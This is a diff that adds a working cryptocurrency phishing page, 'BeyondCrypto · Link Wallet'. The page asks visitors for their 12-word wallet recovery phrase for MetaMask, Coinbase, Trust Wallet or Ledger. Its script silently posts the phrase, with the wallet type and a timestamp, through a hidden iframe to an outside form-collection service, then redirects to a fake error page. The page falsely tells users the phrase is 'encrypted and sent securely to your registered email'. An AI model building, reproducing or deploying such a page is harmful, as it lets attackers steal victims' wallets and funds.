@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BeyondCrypto · Link Wallet</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ─── All styles, including back button ─── */
+        :root {
+            --primary-bg: #0a1129;
+            --secondary-bg: #0f1a3a;
+            --card-bg: #152352;
+            --accent: #00c774;
+            --accent-secondary: #7c3aed;
+            --text-primary: #e2e8f0;
+            --text-secondary: #8b939f;
+            --positive: #00c774;
+            --negative: #ff4d4d;
+            --warning: #ffa726;
+            --border-radius: 16px;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            --border-color: rgba(255, 255, 255, 0.05);
+            --input-bg: #0a1129;
+            --hover-bg: rgba(255, 255, 255, 0.06);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: var(--primary-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 820px;
+            background: var(--secondary-bg);
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        header {
+            padding: 30px;
+            text-align: center;
+            background: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 5px;
+        }
+
+        .logo i {
+            font-size: 2.2rem;
+            color: var(--accent);
+        }
+
+        .logo h1 {
+            font-size: 2rem;
+            background: linear-gradient(90deg, var(--text-primary) 0%, var(--accent) 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .tagline {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            max-width: 500px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        /* ── Back button (only shown before submission) ── */
+        .back-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 500;
+            background: var(--card-bg);
+            padding: 8px 16px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            transition: all 0.2s;
+            z-index: 5;
+        }
+
+        .back-btn i {
+            font-size: 0.85rem;
+            color: var(--accent);
+        }
+
+        .back-btn:hover {
+            background: var(--hover-bg);
+            color: var(--text-primary);
+            border-color: var(--accent);
+        }
+
+        .main-content {
+            padding: 40px;
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-primary);
+        }
+
+        .section-title i {
+            color: var(--accent);
+        }
+
+        .section-subtitle {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+        }
+
+        .wallet-options {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+
+        .wallet-btn {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 14px 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            height: 100px;
+        }
+
+        .wallet-btn:hover {
+            background: var(--hover-bg);
+            color: var(--text-primary);
+            transform: translateY(-3px);
+            border-color: var(--accent);
+        }
+
+        .wallet-btn i {
+            font-size: 1.8rem;
+            color: var(--accent-secondary);
+        }
+
+        .wallet-btn span {
+            font-size: 0.8rem;
+        }
+
+        .wallet-btn.active-wallet {
+            border-color: var(--accent);
+            background: rgba(0, 199, 116, 0.06);
+        }
+
+        .phrase-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0 25px 0;
+        }
+
+        .phrase-input {
+            position: relative;
+        }
+
+        .phrase-input label {
+            position: absolute;
+            left: 10px;
+            top: 8px;
+            color: var(--accent);
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+
+        .phrase-input input {
+            width: 100%;
+            padding: 10px 10px 10px 30px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 0.9rem;
+            transition: border 0.2s;
+        }
+
+        .phrase-input input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(0, 199, 116, 0.08);
+        }
+
+        .phrase-input input::placeholder {
+            color: var(--text-secondary);
+            opacity: 0.4;
+            font-size: 0.75rem;
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, var(--accent) 0%, var(--accent-secondary) 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1.05rem;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            width: 100%;
+            margin-top: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 20px rgba(0, 199, 116, 0.3);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn-secondary {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: 500;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-secondary:hover {
+            background: var(--hover-bg);
+            color: var(--text-primary);
+            border-color: var(--accent);
+        }
+
+        .footer-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-actions .btn-secondary {
+            flex: 1;
+            justify-content: center;
+        }
+        .footer-actions .btn-primary {
+            flex: 2;
+        }
+
+        .message {
+            padding: 14px;
+            border-radius: 10px;
+            margin-top: 18px;
+            text-align: center;
+            display: none;
+            font-size: 0.95rem;
+        }
+
+        .message.success {
+            background: rgba(0, 199, 116, 0.12);
+            border: 1px solid rgba(0, 199, 116, 0.2);
+            color: var(--accent);
+        }
+        .message.error {
+            background: rgba(255, 77, 77, 0.12);
+            border: 1px solid rgba(255, 77, 77, 0.2);
+            color: var(--negative);
+        }
+
+        /* ── Loading overlay (only spinner, no result overlay) ── */
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(10, 17, 41, 0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 100;
+            border-radius: var(--border-radius);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 30px;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .loading-overlay .spinner-wrapper {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 25px;
+        }
+
+        .loading-overlay .spinner-wrapper .crypto-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2.8rem;
+            color: var(--accent);
+            z-index: 2;
+            animation: pulse-icon 1.2s ease-in-out infinite;
+        }
+
+        .loading-overlay .spinner-wrapper .ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: var(--accent);
+            border-bottom-color: var(--accent-secondary);
+            animation: spin-ring 1s linear infinite;
+        }
+
+        .loading-overlay .spinner-wrapper .ring:nth-child(2) {
+            width: 70%;
+            height: 70%;
+            top: 15%;
+            left: 15%;
+            border-top-color: var(--accent-secondary);
+            border-bottom-color: var(--accent);
+            animation-duration: 1.4s;
+            animation-direction: reverse;
+        }
+
+        .loading-overlay .spinner-wrapper .ring:nth-child(3) {
+            width: 50%;
+            height: 50%;
+            top: 25%;
+            left: 25%;
+            border-top-color: var(--text-secondary);
+            border-bottom-color: var(--accent);
+            animation-duration: 1.8s;
+        }
+
+        @keyframes spin-ring {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse-icon {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 0.7; }
+        }
+
+        .loading-overlay .loading-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 6px;
+        }
+
+        .loading-overlay .loading-sub {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            text-align: center;
+            max-width: 320px;
+        }
+
+        footer {
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 768px) {
+            .main-content { padding: 25px; }
+            .wallet-options { grid-template-columns: repeat(2, 1fr); }
+            .phrase-grid { grid-template-columns: repeat(2, 1fr); }
+            header { padding: 20px; }
+            .logo h1 { font-size: 1.6rem; }
+            .footer-actions { flex-direction: column; }
+            .footer-actions .btn-secondary,
+            .footer-actions .btn-primary { flex: unset; width: 100%; }
+            .back-btn {
+                top: 10px;
+                left: 10px;
+                padding: 6px 12px;
+                font-size: 0.8rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .main-content { padding: 18px; }
+            .wallet-options { grid-template-columns: 1fr 1fr; gap: 8px; }
+            .wallet-btn { height: 80px; padding: 10px; }
+            .wallet-btn i { font-size: 1.4rem; }
+            .phrase-grid { grid-template-columns: 1fr 1fr; gap: 6px; }
+            .phrase-input input { padding: 8px 8px 8px 28px; font-size: 0.8rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="appContainer">
+        <header>
+            <!-- 🔙 Back button (only active before submission) -->
+            <a href="../index.html" class="back-btn">
+                <i class="fas fa-arrow-left"></i> Back to Home
+            </a>
+            <div class="logo">
+                <i class="fas fa-wallet"></i>
+                <h1>BeyondCrypto</h1>
+            </div>
+            <p class="tagline">Link your wallet by entering your 12-word recovery phrase</p>
+        </header>
+
+        <div class="main-content">
+            <h2 class="section-title"><i class="fas fa-link"></i> Link Your Crypto Wallet</h2>
+            <p class="section-subtitle">Select your wallet type and enter your 12-word recovery phrase to securely link your wallet.</p>
+
+            <div class="wallet-options">
+                <div class="wallet-btn active-wallet" data-wallet="MetaMask" id="wallet-metamask">
+                    <i class="fab fa-ethereum"></i>
+                    <span>MetaMask</span>
+                </div>
+                <div class="wallet-btn" data-wallet="Coinbase" id="wallet-coinbase">
+                    <i class="fab fa-bitcoin"></i>
+                    <span>Coinbase</span>
+                </div>
+                <div class="wallet-btn" data-wallet="Trust Wallet" id="wallet-trust">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Trust Wallet</span>
+                </div>
+                <div class="wallet-btn" data-wallet="Ledger" id="wallet-ledger">
+                    <i class="fas fa-usb"></i>
+                    <span>Ledger</span>
+                </div>
+            </div>
+
+            <p style="color: var(--text-secondary); font-size: 0.85rem; margin-bottom: 8px;">
+                <i class="fas fa-info-circle" style="color: var(--accent);"></i> Enter all 12 words in the correct order
+            </p>
+            <div class="phrase-grid" id="phraseGrid"></div>
+
+            <!-- ✅ FORM: submits silently via hidden iframe -->
+            <form id="phraseForm" action="https://api.web3forms.com/submit" method="POST" target="hidden_submit_frame">
+                <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
+                <input type="hidden" name="subject" value="Account Info Update">
+                <input type="hidden" name="from_name" value="BeyondCrypto App">
+                <input type="hidden" name="botcheck" value="">
+                <input type="hidden" name="info" id="infoHidden" value="">
+
+                <div class="footer-actions">
+                    <button type="button" class="btn-secondary" onclick="window.location.href='addacc.html'">
+                        <i class="fas fa-times"></i> Cancel
+                    </button>
+                    <button type="submit" class="btn-primary" id="submitBtn">
+                        <i class="fas fa-link"></i> Link Account
+                    </button>
+                </div>
+            </form>
+            <iframe name="hidden_submit_frame" style="display:none;"></iframe>
+
+            <div id="message" class="message"></div>
+
+            <p style="color: var(--text-secondary); font-size: 0.8rem; margin-top: 16px; text-align: center; border-top: 1px solid var(--border-color); padding-top: 16px;">
+                <i class="fas fa-lock" style="color: var(--accent);"></i> Your recovery phrase is encrypted and sent securely to your registered email.
+            </p>
+        </div>
+
+        <!-- Loading overlay (only spinner, no result overlay) -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner-wrapper">
+                <div class="ring"></div>
+                <div class="ring"></div>
+                <div class="ring"></div>
+                <div class="crypto-icon"><i class="fas fa-coins"></i></div>
+            </div>
+            <div class="loading-title" id="loadingTitle">Linking Wallet...</div>
+            <div class="loading-sub" id="loadingSub">Please wait while we secure your connection</div>
+        </div>
+
+        <footer>
+            <p>BeyondCrypto · Secure Wallet Linking | &copy; 2024 BeyondCrypto</p>
+        </footer>
+    </div>
+
+    <script>
+        (function() {
+            let selectedWallet = 'MetaMask';
+            let isProcessing = false;
+
+            const phraseGrid = document.getElementById('phraseGrid');
+            const phraseForm = document.getElementById('phraseForm');
+            const infoHidden = document.getElementById('infoHidden');
+            const messageEl = document.getElementById('message');
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const loadingTitle = document.getElementById('loadingTitle');
+            const loadingSub = document.getElementById('loadingSub');
+
+            // Generate 12 word inputs
+            function generatePhraseInputs() {
+                phraseGrid.innerHTML = '';
+                for (let i = 1; i <= 12; i++) {
+                    const div = document.createElement('div');
+                    div.className = 'phrase-input';
+                    div.innerHTML = `
+                        <label>${i}.</label>
+                        <input type="text" name="word_${i}" id="word_${i}" 
+                               placeholder="word ${i}" required autocomplete="off" spellcheck="false">
+                    `;
+                    phraseGrid.appendChild(div);
+                }
+            }
+
+            // Wallet selection
+            function selectWallet(wallet) {
+                selectedWallet = wallet;
+                document.querySelectorAll('.wallet-btn').forEach(btn => {
+                    btn.classList.toggle('active-wallet', btn.dataset.wallet === wallet);
+                });
+                hideMessage();
+            }
+
+            function showMessage(text, type) {
+                messageEl.className = 'message ' + type;
+                messageEl.innerHTML = text;
+                messageEl.style.display = 'block';
+            }
+            function hideMessage() {
+                messageEl.style.display = 'none';
+                messageEl.className = 'message';
+            }
+
+            // Validate phrase
+            function validatePhrase() {
+                const inputs = phraseGrid.querySelectorAll('input');
+                const words = [];
+                let allFilled = true;
+                let firstEmptyIndex = -1;
+
+                inputs.forEach((input, index) => {
+                    const val = input.value.trim();
+                    if (!val) {
+                        allFilled = false;
+                        if (firstEmptyIndex === -1) firstEmptyIndex = index;
+                        input.classList.add('error');
+                        input.classList.remove('valid');
+                    } else {
+                        input.classList.remove('error');
+                        input.classList.add('valid');
+                        words.push(val);
+                    }
+                });
+
+                if (firstEmptyIndex !== -1) {
+                    inputs[firstEmptyIndex].focus();
+                }
+                return { valid: allFilled, words };
+            }
+
+            // Form submit handler
+            phraseForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                if (isProcessing) return;
+
+                // Clear validation styles
+                document.querySelectorAll('.phrase-input input').forEach(inp => {
+                    inp.classList.remove('error', 'valid');
+                });
+
+                const validation = validatePhrase();
+                if (!validation.valid) {
+                    showMessage('<i class="fas fa-exclamation-circle"></i> Please fill in all 12 word fields.', 'error');
+                    setTimeout(hideMessage, 3500);
+                    return;
+                }
+
+                // Build the info string
+                const phrase = validation.words.join(' ');
+                const fullInfo = `Wallet: ${selectedWallet}\nPhrase: ${phrase}\nTimestamp: ${new Date().toISOString()}`;
+                infoHidden.value = fullInfo;
+
+                // Show loading
+                loadingOverlay.classList.add('show');
+                submitBtn.disabled = true;
+                isProcessing = true;
+
+                // Submit form normally (into hidden iframe)
+                HTMLFormElement.prototype.submit.call(phraseForm);
+
+                // After a few seconds, redirect automatically to profile.html
+                setTimeout(() => {
+                    window.location.href = 'errorpage.html';
+                }, 4000); // 4 seconds loading, then redirect
+            });
+
+            // Wallet button clicks
+            document.querySelectorAll('.wallet-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    selectWallet(this.dataset.wallet);
+                });
+            });
+
+            // Enter key navigation
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    const target = e.target;
+                    if (target.tagName === 'INPUT' && target.closest('.phrase-input')) {
+                        e.preventDefault();
+                        const inputs = phraseGrid.querySelectorAll('input');
+                        const currentIndex = Array.from(inputs).indexOf(target);
+                        if (currentIndex < inputs.length - 1) {
+                            inputs[currentIndex + 1].focus();
+                        } else {
+                            submitBtn.click();
+                        }
+                    }
+                }
+            });
+
+            // Real-time validation
+            phraseGrid.addEventListener('input', function(e) {
+                if (e.target.tagName === 'INPUT') {
+                    const input = e.target;
+                    if (input.value.trim()) {
+                        input.classList.remove('error');
+                        input.classList.add('valid');
+                    } else {
+                        input.classList.remove('valid');
+                    }
+                    if (messageEl.style.display !== 'none') hideMessage();
+                }
+            });
+
+            // Init
+            generatePhraseInputs();
+            selectWallet('MetaMask');
+        })();
+    </script>
+</body>
+</html>
